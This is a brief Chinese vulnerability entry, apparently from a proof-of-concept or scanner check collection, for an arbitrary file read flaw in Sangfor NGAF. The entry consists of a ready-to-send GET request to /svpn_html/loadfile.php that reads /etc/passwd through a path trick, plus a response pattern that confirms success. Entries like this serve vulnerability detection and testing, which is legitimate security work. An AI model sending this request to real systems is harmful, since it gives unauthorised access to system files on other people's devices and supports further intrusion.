# 深信服NGAF任意文件读取漏洞

深信服 ｜ 任意文件读取/写入 ｜ —
- **请求**：`GET /svpn_html/loadfile.php?file=/etc/./passwd HTTP/1.1`
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$